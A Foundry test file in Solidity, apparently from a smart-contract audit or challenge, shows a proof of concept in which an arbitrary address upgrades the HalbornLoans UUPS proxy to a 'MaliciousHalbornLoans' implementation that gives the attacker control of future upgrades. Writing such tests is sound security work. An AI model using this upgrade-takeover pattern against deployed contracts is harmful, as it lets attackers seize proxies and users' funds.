// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";

contract MaliciousHalbornLoans is UUPSUpgradeable {
    modifier onlyAttacker() {
        require(msg.sender == address(0xdeadbea7), "Caller is not the attacker");
        _;
    }

    function isSuccessfulUpgrade() public pure returns (bool) {
        return true;
    }

    function _authorizeUpgrade(address) internal override onlyAttacker {}
}

contract HalbornTestUpgrades is Test {
    HalbornLoans public loans;

    function setUp() public {
        HalbornLoans impl = new HalbornLoans(2 ether);
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl), 
            abi.encodeWithSignature("initialize(address,address)", address(1), address(2))
        );

        loans = HalbornLoans(address(proxy));
    }

    function testUpgradeLoans() public {
        vm.startPrank(address(0xdeadbea7));
        MaliciousHalbornLoans newImpl = new MaliciousHalbornLoans();
        loans.upgradeTo(address(newImpl));
        assertTrue(newImpl.isSuccessfulUpgrade());
        vm.stopPrank();
    }
}
